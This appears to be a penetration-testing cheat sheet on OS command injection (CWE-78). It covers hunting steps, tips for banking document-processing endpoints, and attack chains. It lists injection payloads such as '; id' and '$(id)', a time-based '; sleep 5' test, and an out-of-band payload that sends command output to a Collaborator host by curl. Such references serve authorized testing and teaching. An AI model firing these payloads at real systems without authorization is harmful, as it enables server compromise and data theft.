# 23 — OS Command Injection

**CWE-78** | **CVSS: 9.8 Critical** | **OWASP A03:2021**

---

## What Is It?

OS command injection occurs when user input is passed unsanitized to system shell commands. Allows execution of arbitrary OS commands with the web application's privilege level.

> **Core Problem:** Application constructs shell command strings incorporating user-supplied data.

---

## Hunting Methodology

1. Identify input points that may reach OS commands: `ping`, `dig`, `nslookup`, `curl`, file conversion.
2. Test basic injection: `; id`, `| whoami`, `&& id`, `` `id` ``, `$(id)`.
3. Test blind via time: `; sleep 5` — measure response delay.
4. Test OOB: `; curl http://burp-collaborator.net/$(id)` — check for DNS/HTTP callback.
5. Check image processing: ImageMagick, ffmpeg — vulnerable to argument injection.
6. Check filename processing: `; id` in uploaded filename.
7. Test network utilities: ping, traceroute, nslookup fields for injection.
8. Banking: server-side file generation, statement processing, document conversion.

---

## Tips & Tricks

- **#1** Always test all shell metacharacters: `; | & && || ` $()` — different shells accept different chars.
- **#2** Blind injection: time-based is reliable but slow. OOB via Collaborator is faster.
- **#3** ImageMagick: test any image upload/processing endpoint — ImageTragick still found in wild.
- **#4** Banking: PDF generation, report export often calls OS tools — prime injection surface.

---

## Deadly Chains

```
Command injection → RCE → reverse shell → lateral movement
Blind command injection → OOB data exfil → credential theft
Command injection in image processor → server compromise → DB access
Banking document processor + command injection → full server access
```
